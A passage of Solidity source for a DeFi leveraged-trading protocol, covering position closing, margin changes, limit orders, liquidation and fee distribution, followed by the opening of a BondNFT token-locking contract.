_tigAsset, true, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_tradeInfo.asset, _tigAsset, true, _positionSize);\n            }\n        }\n        _updateFunding(_tradeInfo.asset, _tigAsset);\n        position.mint(\n            _mintTrade\n        );\n        unchecked {\n            emit PositionOpened(_tradeInfo, 0, _price, position.getCount()-1, _trader, _marginAfterFees);\n        }   \n    }\n\n    /**\n     * @dev initiate closing position\n     * @param _id id of the position NFT\n     * @param _percent percent of the position being closed in BP\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _stableVault StableVault address\n     * @param _outputToken Token received upon closing trade\n     * @param _trader address the trade is initiated for\n     */\n    function initiateCloseOrder(\n        uint _id,\n        uint _percent,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _stableVault,\n        address _outputToken,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkDelay(_id, false);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _outputToken);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit        \n        (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n\n        if (_percent > DIVISION_CONSTANT || _percent == 0) revert BadClosePercent();\n        _closePosition(_id, _percent, _price, _stableVault, _outputToken, false); \n    }\n\n    /**\n     * @param _id position id\n     * @param _addMargin margin amount used to add to the position\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _stableVault StableVault address\n     * @param _marginAsset Token being used to add to the position\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function addToPosition(\n        uint _id,\n        uint _addMargin,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _stableVault,\n        address _marginAsset,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkDelay(_id, true);\n        IPosition.Trade memory _trade = position.trades(_id);\n        tradingExtension.validateTrade(_trade.asset, _trade.tigAsset, _trade.margin + _addMargin, _trade.leverage);\n        _checkVault(_stableVault, _marginAsset);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        uint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);\n        _handleDeposit(\n            _trade.tigAsset,\n            _marginAsset,\n            _addMargin - _fee,\n            _stableVault,\n            _permitData,\n            _trader\n        );\n        position.setAccInterest(_id);\n        unchecked {\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, _trade.direction ? 1 : 2);\n            uint _positionSize = (_addMargin - _fee) * _trade.leverage / 1e18;\n            if (_trade.direction) {\n                tradingExtension.modifyLongOi(_trade.asset, _trade.tigAsset, true, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_trade.asset, _trade.tigAsset, true, _positionSize);     \n            }\n            _updateFunding(_trade.asset, _trade.tigAsset);\n            _addMargin -= _fee;\n            uint _newMargin = _trade.margin + _addMargin;\n            uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\n\n            position.addToPosition(\n                _trade.id,\n                _newMargin,\n                _newPrice\n            );\n            \n            emit AddToPosition(_trade.id, _newMargin, _newPrice, _trade.trader);\n        }\n    }\n\n    /**\n     * @param _tradeInfo Trade info\n     * @param _orderType type of limit order used to open the position\n     * @param _price limit price\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function initiateLimitOrder(\n        TradeInfo calldata _tradeInfo,\n        uint256 _orderType, // 1 limit, 2 stop\n        uint256 _price,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n        tradingExtension.validateTrade(_tradeInfo.asset, _tigAsset, _tradeInfo.margin, _tradeInfo.leverage);\n        _checkVault(_tradeInfo.stableVault, _tradeInfo.marginAsset);\n        if (_orderType == 0) revert(\"5\");\n        if (_price == 0) revert NoPrice();\n        tradingExtension._setReferral(_tradeInfo.referral, _trader);\n        _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n        _checkSl(_tradeInfo.slPrice, _tradeInfo.direction, _price);\n        uint256 _id = position.getCount();\n        position.mint(\n            IPosition.MintTrade(\n                _trader,\n                _tradeInfo.margin,\n                _tradeInfo.leverage,\n                _tradeInfo.asset,\n                _tradeInfo.direction,\n                _price,\n                _tradeInfo.tpPrice,\n                _tradeInfo.slPrice,\n                _orderType,\n                _tigAsset\n            )\n        );\n        limitDelay[_id] = block.timestamp + 4;\n        emit PositionOpened(_tradeInfo, _orderType, _price, _id, _trader, _tradeInfo.margin);\n    }\n\n    /**\n     * @param _id position ID\n     * @param _trader address the trade is initiated for\n     */\n    function cancelLimitOrder(\n        uint256 _id,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType == 0) revert();\n        IStable(_trade.tigAsset).mintFor(_trader, _trade.margin);\n        position.burn(_id);\n        emit LimitCancelled(_id, _trader);\n    }\n\n    /**\n     * @param _id position id\n     * @param _marginAsset Token being used to add to the position\n     * @param _stableVault StableVault address\n     * @param _addMargin margin amount being added to the position\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function addMargin(\n        uint256 _id,\n        address _marginAsset,\n        address _stableVault,\n        uint256 _addMargin,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _marginAsset);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(); //IsLimit\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_trade.asset);\n        _handleDeposit(_trade.tigAsset, _marginAsset, _addMargin, _stableVault, _permitData, _trader);\n        unchecked {\n            uint256 _newMargin = _trade.margin + _addMargin;\n            uint256 _newLeverage = _trade.margin * _trade.leverage / _newMargin;\n            if (_newLeverage < asset.minLeverage) revert(\"!lev\");\n            position.modifyMargin(_id, _newMargin, _newLeverage);\n            emit MarginModified(_id, _newMargin, _newLeverage, true, _trader);\n        }\n    }\n\n    /**\n     * @param _id position id\n     * @param _stableVault StableVault address\n     * @param _outputToken token the trader will receive\n     * @param _removeMargin margin amount being removed from the position\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _trader address the trade is initiated for\n     */\n    function removeMargin(\n        uint256 _id,\n        address _stableVault,\n        address _outputToken,\n        uint256 _removeMargin,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _outputToken);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(); //IsLimit\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_trade.asset);\n        uint256 _newMargin = _trade.margin - _removeMargin;\n        uint256 _newLeverage = _trade.margin * _trade.leverage / _newMargin;\n        if (_newLeverage > asset.maxLeverage) revert(\"!lev\");\n        (uint _assetPrice,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n        (,int256 _payout) = TradingLibrary.pnl(_trade.direction, _assetPrice, _trade.price, _newMargin, _newLeverage, _trade.accInterest);\n        unchecked {\n            if (_payout <= int256(_newMargin*(DIVISION_CONSTANT-liqPercent)/DIVISION_CONSTANT)) revert LiqThreshold();\n        }\n        position.modifyMargin(_trade.id, _newMargin, _newLeverage);\n        _handleWithdraw(_trade, _stableVault, _outputToken, _removeMargin);\n        emit MarginModified(_trade.id, _newMargin, _newLeverage, false, _trader);\n    }\n\n    /**\n     * @param _type true for TP, false for SL\n     * @param _id position id\n     * @param _limitPrice TP/SL trigger price\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _trader address the trade is initiated for\n     */\n    function updateTpSl(\n        bool _type,\n        uint _id,\n        uint _limitPrice,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        if (_type) {\n            position.modifyTp(_id, _limitPrice);\n        } else {\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n            _checkSl(_limitPrice, _trade.direction, _price);\n            position.modifySl(_id, _limitPrice);\n        }\n        emit UpdateTPSL(_id, _type, _limitPrice, _trader);\n    }\n\n    /**\n     * @param _id position id\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     */\n    function executeLimitOrder(\n        uint _id, \n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) \n        external\n    {\n        unchecked {\n            _checkDelay(_id, true);\n            tradingExtension._checkGas();\n            if (tradingExtension.paused()) revert TradingPaused();\n            require(block.timestamp >= limitDelay[_id]);\n            IPosition.Trade memory trade = position.trades(_id);\n            uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true);\n            (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0);\n            if (trade.orderType == 0) revert(\"5\");\n            if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n            if (trade.direction && trade.orderType == 1) {\n                if (trade.price < _price) revert(\"6\"); //LimitNotMet\n            } else if (!trade.direction && trade.orderType == 1) {\n                if (trade.price > _price) revert(\"6\"); //LimitNotMet\n            } else if (!trade.direction && trade.orderType == 2) {\n                if (trade.price < _price) revert(\"6\"); //LimitNotMet\n                trade.price = _price;\n            } else {\n                if (trade.price > _price) revert(\"6\"); //LimitNotMet\n                trade.price = _price;\n            } \n            if(trade.direction) {\n                trade.price += trade.price * _spread / DIVISION_CONSTANT;\n            } else {\n                trade.price -= trade.price * _spread / DIVISION_CONSTANT;\n            }\n            if (trade.direction) {\n                tradingExtension.modifyLongOi(trade.asset, trade.tigAsset, true, trade.margin*trade.leverage/1e18);\n            } else {\n                tradingExtension.modifyShortOi(trade.asset, trade.tigAsset, true, trade.margin*trade.leverage/1e18);\n            }\n            _updateFunding(trade.asset, trade.tigAsset);\n            position.executeLimitOrder(_id, trade.price, trade.margin - _fee);\n            emit LimitOrderExecuted(trade.asset, trade.direction, trade.price, trade.leverage, trade.margin - _fee, _id, trade.trader, _msgSender());\n        }\n    }\n\n    /**\n     * @notice liquidate position\n     * @param _id id of the position NFT\n     * @param _priceData verifiable off-chain data\n     * @param _signature node signature\n     */\n    function liquidatePosition(\n        uint _id,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        unchecked {\n            tradingExtension._checkGas();\n            IPosition.Trade memory _trade = position.trades(_id);\n            if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n            (uint256 _positionSizeAfterPrice, int256 _payout) = TradingLibrary.pnl(_trade.direction, _price, _trade.price, _trade.margin, _trade.leverage, _trade.accInterest);\n            uint256 _positionSize = _trade.margin*_trade.leverage/1e18;\n            if (_payout > int256(_trade.margin*(DIVISION_CONSTANT-liqPercent)/DIVISION_CONSTANT)) revert NotLiquidatable();\n            if (_trade.direction) {\n                tradingExtension.modifyLongOi(_trade.asset, _trade.tigAsset, false, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_trade.asset, _trade.tigAsset, false, _positionSize);\n            }\n            _updateFunding(_trade.asset, _trade.tigAsset);\n            _handleCloseFees(_trade.asset, type(uint).max, _trade.tigAsset, _positionSizeAfterPrice, _trade.trader, true);\n            position.burn(_id);\n            emit PositionLiquidated(_id, _trade.trader, _msgSender());\n        }\n    }\n\n    /**\n     * @dev close position at a pre-set price\n     * @param _id id of the position NFT\n     * @param _tp true if take profit\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     */\n    function limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        _checkDelay(_id, false);\n        (uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);\n        _closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);\n    }\n\n    /**\n     * @notice Trader can approve a proxy wallet address for it to trade on its behalf. Can also provide proxy wallet with gas.\n     * @param _proxy proxy wallet address\n     * @param _timestamp end timestamp of approval period\n     */\n    function approveProxy(address _proxy, uint256 _timestamp) external payable {\n        proxyApprovals[_msgSender()] = Proxy(\n            _proxy,\n            _timestamp\n        );\n        payable(_proxy).transfer(msg.value);\n    }\n\n    // ===== INTERNAL FUNCTIONS =====\n\n    /**\n     * @dev close the initiated position.\n     * @param _id id of the position NFT\n     * @param _percent percent of the position being closed\n     * @param _price pair price\n     * @param _stableVault StableVault address\n     * @param _outputToken Token that trader will receive\n     * @param _isBot false if closed via market order\n     */\n    function _closePosition(\n        uint _id,\n        uint _percent,\n        uint _price,\n        address _stableVault,\n        address _outputToken,\n        bool _isBot\n    )\n        internal\n    {\n        (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout) = tradingExtension._closePosition(_id, _price, _percent);\n        position.setAccInterest(_id);\n        _updateFunding(_trade.asset, _trade.tigAsset);\n        if (_percent < DIVISION_CONSTANT) {\n            if ((_trade.margin*_trade.leverage*(DIVISION_CONSTANT-_percent)/DIVISION_CONSTANT)/1e18 < tradingExtension.minPos(_trade.tigAsset)) revert(\"!size\");\n            position.reducePosition(_id, _percent);\n        } else {\n            position.burn(_id);\n        }\n        uint256 _toMint;\n        if (_payout > 0) {\n            unchecked {\n                _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n                if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) {\n                    _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n                }\n            }\n            _handleWithdraw(_trade, _stableVault, _outputToken, _toMint);\n        }\n        emit PositionClosed(_id, _price, _percent, _toMint, _trade.trader, _isBot ? _msgSender() : _trade.trader);\n    }\n\n    /**\n     * @dev handle stablevault deposits for different trading functions\n     * @param _tigAsset tigAsset token address\n     * @param _marginAsset token being deposited into stablevault\n     * @param _margin amount being deposited\n     * @param _stableVault StableVault address\n     * @param _permitData Data for approval via permit\n     * @param _trader Trader address to take tokens from\n     */\n    function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault, ERC20PermitData calldata _permitData, address _trader) internal {\n        IStable tigAsset = IStable(_tigAsset);\n        if (_tigAsset != _marginAsset) {\n            if (_permitData.usePermit) {\n                ERC20Permit(_marginAsset).permit(_trader, address(this), _permitData.amount, _permitData.deadline, _permitData.v, _permitData.r, _permitData.s);\n            }\n            uint256 _balBefore = tigAsset.balanceOf(address(this));\n            uint _marginDecMultiplier = 10**(18-ExtendedIERC20(_marginAsset).decimals());\n            IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);\n            IERC20(_marginAsset).approve(_stableVault, type(uint).max);\n            IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier);\n            if (tigAsset.balanceOf(address(this)) != _balBefore + _margin) revert BadDeposit();\n            tigAsset.burnFrom(address(this), tigAsset.balanceOf(address(this)));\n        } else {\n            tigAsset.burnFrom(_trader, _margin);\n        }        \n    }\n\n    /**\n     * @dev handle stablevault withdrawals for different trading functions\n     * @param _trade Position info\n     * @param _stableVault StableVault address\n     * @param _outputToken Output token address\n     * @param _toMint Amount of tigAsset minted to be used for withdrawal\n     */\n    function _handleWithdraw(IPosition.Trade memory _trade, address _stableVault, address _outputToken, uint _toMint) internal {\n        IStable(_trade.tigAsset).mintFor(address(this), _toMint);\n        if (_outputToken == _trade.tigAsset) {\n            IERC20(_outputToken).transfer(_trade.trader, _toMint);\n        } else {\n            uint256 _balBefore = IERC20(_outputToken).balanceOf(address(this));\n            IStableVault(_stableVault).withdraw(_outputToken, _toMint);\n            if (IERC20(_outputToken).balanceOf(address(this)) != _balBefore + _toMint/(10**(18-ExtendedIERC20(_outputToken).decimals()))) revert BadWithdraw();\n            IERC20(_outputToken).transfer(_trade.trader, IERC20(_outputToken).balanceOf(address(this)) - _balBefore);\n        }        \n    }\n\n    /**\n     * @dev handle fees distribution for opening\n     * @param _asset asset id\n     * @param _positionSize position size\n     * @param _trader trader address\n     * @param _tigAsset tigAsset address\n     * @param _isBot false if opened via market order\n     * @return _feePaid total fees paid during opening\n     */\n    function _handleOpenFees(\n        uint _asset,\n        uint _positionSize,\n        address _trader,\n        address _tigAsset,\n        bool _isBot\n    )\n        internal\n        returns (uint _feePaid)\n    {\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n        Fees memory _fees = openFees;\n        unchecked {\n            _fees.daoFees = _fees.daoFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.burnFees = _fees.burnFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.referralFees = _fees.referralFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.botFees = _fees.botFees * asset.feeMultiplier / DIVISION_CONSTANT;\n        }\n        address _referrer = tradingExtension.getRef(_trader); //referrals.getReferral(referrals.getReferred(_trader));\n        if (_referrer != address(0)) {\n            unchecked {\n                IStable(_tigAsset).mintFor(\n                    _referrer,\n                    _positionSize\n                    * _fees.referralFees // get referral fee%\n                    / DIVISION_CONSTANT // divide by 100%\n                );\n            }\n            _fees.daoFees = _fees.daoFees - _fees.referralFees*2;\n        }\n        if (_isBot) {\n            unchecked {\n                IStable(_tigAsset).mintFor(\n                    _msgSender(),\n                    _positionSize\n                    * _fees.botFees // get bot fee%\n                    / DIVISION_CONSTANT // divide by 100%\n                );\n            }\n            _fees.daoFees = _fees.daoFees - _fees.botFees;\n        } else {\n            _fees.botFees = 0;\n        }\n        unchecked {\n            uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n            _feePaid =\n                _positionSize\n                * (_fees.burnFees + _fees.botFees) // get total fee%\n                / DIVISION_CONSTANT // divide by 100%\n                + _daoFeesPaid;\n            emit FeesDistributed(\n                _tigAsset,\n                _daoFeesPaid,\n                _positionSize * _fees.burnFees / DIVISION_CONSTANT,\n                _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0,\n                _positionSize * _fees.botFees / DIVISION_CONSTANT,\n                _referrer\n            );\n            IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        }\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n    }\n\n    /**\n     * @dev handle fees distribution for closing\n     * @param _asset asset id\n     * @param _payout payout to trader before fees\n     * @param _tigAsset margin asset\n     * @param _positionSize position size\n     * @param _trader trader address\n     * @param _isBot false if closed via market order\n     * @return payout_ payout to trader after fees\n     */\n    function _handleCloseFees(\n        uint _asset,\n        uint _payout,\n        address _tigAsset,\n        uint _positionSize,\n        address _trader,\n        bool _isBot\n    )\n        internal\n        returns (uint payout_)\n    {\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n        Fees memory _fees = closeFees;\n        uint _daoFeesPaid;\n        uint _burnFeesPaid;\n        uint _referralFeesPaid;\n        unchecked {\n            _daoFeesPaid = (_positionSize*_fees.daoFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n            _burnFeesPaid = (_positionSize*_fees.burnFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n        }\n        uint _botFeesPaid;\n        address _referrer = tradingExtension.getRef(_trader);//referrals.getReferral(referrals.getReferred(_trader));\n        if (_referrer != address(0)) {\n            unchecked {\n                _referralFeesPaid = (_positionSize*_fees.referralFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n            }\n            IStable(_tigAsset).mintFor(\n                _referrer,\n                _referralFeesPaid\n            );\n             _daoFeesPaid = _daoFeesPaid-_referralFeesPaid*2;\n        }\n        if (_isBot) {\n            unchecked {\n                _botFeesPaid = (_positionSize*_fees.botFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n                IStable(_tigAsset).mintFor(\n                    _msgSender(),\n                    _botFeesPaid\n                );\n            }\n            _daoFeesPaid = _daoFeesPaid - _botFeesPaid;\n        }\n        emit FeesDistributed(_tigAsset, _daoFeesPaid, _burnFeesPaid, _referralFeesPaid, _botFeesPaid, _referrer);\n        payout_ = _payout - _daoFeesPaid - _burnFeesPaid - _botFeesPaid;\n        IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, _daoFeesPaid);\n        return payout_;\n    }\n\n    /**\n     * @dev update funding rates after open interest changes\n     * @param _asset asset id\n     * @param _tigAsset tigAsset used for OI\n     */\n    function _updateFunding(uint256 _asset, address _tigAsset) internal {\n        position.updateFunding(\n            _asset,\n            _tigAsset,\n            pairsContract.idToOi(_asset, _tigAsset).longOi,\n            pairsContract.idToOi(_asset, _tigAsset).shortOi,\n            pairsContract.idToAsset(_asset).baseFundingRate,\n            vaultFundingPercent\n        );\n    }\n\n    /**\n     * @dev check that SL price is valid compared to market price\n     * @param _sl SL price\n     * @param _direction long/short\n     * @param _price market price\n     */\n    function _checkSl(uint _sl, bool _direction, uint _price) internal pure {\n        if (_direction) {\n            if (_sl > _price) revert(\"3\"); //BadStopLoss\n        } else {\n            if (_sl < _price && _sl != 0) revert(\"3\"); //BadStopLoss\n        }\n    }\n\n    /**\n     * @dev check that trader address owns the position\n     * @param _id position id\n     * @param _trader trader address\n     */\n    function _checkOwner(uint _id, address _trader) internal view {\n        if (position.ownerOf(_id) != _trader) revert(\"2\"); //NotPositionOwner   \n    }\n\n    /**\n     * @notice Check that sufficient time has passed between opening and closing\n     * @dev This is to prevent profitable opening and closing in the same tx with two different prices in the \"valid signature pool\".\n     * @param _id position id\n     * @param _type true for opening, false for closing\n     */\n    function _checkDelay(uint _id, bool _type) internal {\n        unchecked {\n            Delay memory _delay = blockDelayPassed[_id];\n            if (_delay.actionType == _type) {\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n            } else {\n                if (block.number < _delay.delay) revert(\"0\"); //Wait\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n                blockDelayPassed[_id].actionType = _type;\n            }\n        }\n    }\n\n    /**\n     * @dev Check that the stablevault input is whitelisted and the margin asset is whitelisted in the vault\n     * @param _stableVault StableVault address\n     * @param _token Margin asset token address\n     */\n    function _checkVault(address _stableVault, address _token) internal view {\n        require(allowedVault[_stableVault], \"Unapproved stablevault\");\n        require(_token == IStableVault(_stableVault).stable() || IStableVault(_stableVault).allowed(_token), \"Token not approved in vault\");\n    }\n\n    /**\n     * @dev Check that the trader has approved the proxy address to trade for it\n     * @param _trader Trader address\n     */\n    function _validateProxy(address _trader) internal view {\n        if (_trader != _msgSender()) {\n            Proxy memory _proxy = proxyApprovals[_trader];\n            require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n        }\n    }\n\n    // ===== GOVERNANCE-ONLY =====\n\n    /**\n     * @dev Sets block delay between opening and closing\n     * @notice In blocks not seconds\n     * @param _blockDelay delay amount\n     */\n    function setBlockDelay(\n        uint _blockDelay\n    )\n        external\n        onlyOwner\n    {\n        blockDelay = _blockDelay;\n    }\n\n    /**\n     * @dev Whitelists a stablevault contract address\n     * @param _stableVault StableVault address\n     * @param _bool true if allowed\n     */\n    function setAllowedVault(\n        address _stableVault,\n        bool _bool\n    )\n        external\n        onlyOwner\n    {\n        allowedVault[_stableVault] = _bool;\n    }\n\n    /**\n     * @dev Sets max payout % compared to margin\n     * @param _maxWinPercent payout %\n     */\n    function setMaxWinPercent(\n        uint _maxWinPercent\n    )\n        external\n        onlyOwner\n    {\n        maxWinPercent = _maxWinPercent;\n    }\n\n    /**\n     * @dev Sets executable price range for limit orders\n     * @param _range price range in %\n     */\n    function setLimitOrderPriceRange(uint _range) external onlyOwner {\n        limitOrderPriceRange = _range;\n    }\n\n    /**\n     * @dev Sets the fees for the trading protocol\n     * @param _open True if open fees are being set\n     * @param _daoFees Fees distributed to the DAO\n     * @param _burnFees Fees which get burned\n     * @param _referralFees Fees given to referrers\n     * @param _botFees Fees given to bots that execute limit orders\n     * @param _percent Percent of earned funding fees going to StableVault\n     */\n    function setFees(bool _open, uint _daoFees, uint _burnFees, uint _referralFees, uint _botFees, uint _percent) external onlyOwner {\n        unchecked {\n            require(_daoFees >= _botFees+_referralFees*2);\n            if (_open) {\n                openFees.daoFees = _daoFees;\n                openFees.burnFees = _burnFees;\n                openFees.referralFees = _referralFees;\n                openFees.botFees = _botFees;\n            } else {\n                closeFees.daoFees = _daoFees;\n                closeFees.burnFees = _burnFees;\n                closeFees.referralFees = _referralFees;\n                closeFees.botFees = _botFees;                \n            }\n            require(_percent <= DIVISION_CONSTANT);\n            vaultFundingPercent = _percent;\n        }\n    }\n\n    /**\n     * @dev Sets the extension contract address for trading\n     * @param _ext extension contract address\n     */\n    function setTradingExtension(\n        address _ext\n    ) external onlyOwner() {\n        tradingExtension = ITradingExtension(_ext);\n    }\n\n    // ===== EVENTS =====\n\n    event PositionOpened(\n        TradeInfo _tradeInfo,\n        uint _orderType,\n        uint _price,\n        uint _id,\n        address _trader,\n        uint _marginAfterFees\n    );\n\n    event PositionClosed(\n        uint _id,\n        uint _closePrice,\n        uint _percent,\n        uint _payout,\n        address _trader,\n        address _executor\n    );\n\n    event PositionLiquidated(\n        uint _id,\n        address _trader,\n        address _executor\n    );\n\n    event LimitOrderExecuted(\n        uint _asset,\n        bool _direction,\n        uint _openPrice,\n        uint _lev,\n        uint _margin,\n        uint _id,\n        address _trader,\n        address _executor\n    );\n\n    event UpdateTPSL(\n        uint _id,\n        bool _isTp,\n        uint _price,\n        address _trader\n    );\n\n    event LimitCancelled(\n        uint _id,\n        address _trader\n    );\n\n    event MarginModified(\n        uint _id,\n        uint _newMargin,\n        uint _newLeverage,\n        bool _isMarginAdded,\n        address _trader\n    );\n\n    event AddToPosition(\n        uint _id,\n        uint _newMargin,\n        uint _newPrice,\n        address _trader\n    );\n\n    event FeesDistributed(\n        address _tigAsset,\n        uint _daoFees,\n        uint _burnFees,\n        uint _refFees,\n        uint _botFees,\n        address _referrer\n    );\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract BondNFT is ERC721Enumerable, Ownable {\n    \n    uint constant private DAY = 24 * 60 * 60;\n\n    struct Bond {\n        uint id;\n        address owner;\n        address asset;\n        uint amount;\n        uint mintEpoch;\n        uint mintTime;\n        uint expireEpoch;\n        uint pending;\n        uint shares;\n        uint period;\n        bool expired;\n    }\n\n    mapping(address => uint256) public epoch;\n    uint private totalBonds;\n    string public baseURI;\n    address public manager;\n    address[] public assets;\n\n    mapping(address => bool) public allowedAsset;\n    mapping(address => uint) private assetsIndex;\n    mapping(uint256 => mapping(address => uint256)) private bondPaid;\n    mapping(address => mapping(uint256 => uint256)) private accRewardsPerShare; // tigAsset => epoch => accRewardsPerShare\n    mapping(uint => Bond) private _idToBond;\n    mapping(address => uint) public totalShares;\n    mapping(address => mapping(address => uint)) public userDebt; // user => tigAsset => amount\n\n    constructor(\n        string memory _setBaseURI,\n        string memory _name,\n        string memory _symbol\n    ) ERC721(_name, _symbol) {\n        baseURI = _setBaseURI;\n    }\n\n    /**\n     * @notice Create a bond\n     * @dev Should only be called by a manager contract\n     * @param _asset tigAsset token to lock\n     * @param _amount tigAsset amount\n     * @param _period time to lock for in days\n     * @param _owner address to receive the bond\n     * @return id ID of the minted bond\n     */\n    function createLock(\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _owner\n    ) external onlyManager() returns(uint id) {\n        require(allowedAsset[_asset], \"!Asset\");\n        unchecked {\n            uint shares = _amount * _period / 365;\n            uint expireEpoch = epoch[_asset] + _period;\n            id = ++totalBonds;\n            totalShares[_asset] += shares;\n            Bond memory _bond = Bond(\n                id,             // id\n                address(0),     // owner\n                _asset,         // tigAsset token\n                _amount,        // tigAsset amount\n                epoch[_asset],  // mint epoch\n                block.timestamp,// mint timestamp\n                expireEpoch,    // expire epoch\n                0,              // pending\n                shares,         // linearly scaling share of rewards\n                _period,        // lock period\n                false           // is expired boolean\n            );\n            _idToBond[id] = _bond;\n            _mint(_owner, _bond);\n        }\n        emit Lock(_asset, _amount, _period, _owner, id);\n    }\n\n    /** \n     * @notice Extend the lock period and/or amount of a bond\n     * @dev Should only be called by a manager contract\n     * @param _id ID of the bond\n     * @param _asset tigAsset token address\n     * @param _amount amount of tigAsset being added\n     * @param _period days being added to the bond\n     * @param _sender address extending the bond\n     */\n    function extendLock(\n        uint _id,\n        address _asset,\n        uint _amount,\n        uint _period,\n        address _sender\n    ) external onlyManager() {\n        Bond memory bond = idToBond(_id);\n        Bond storage _bond = _idToBond[_id];\n        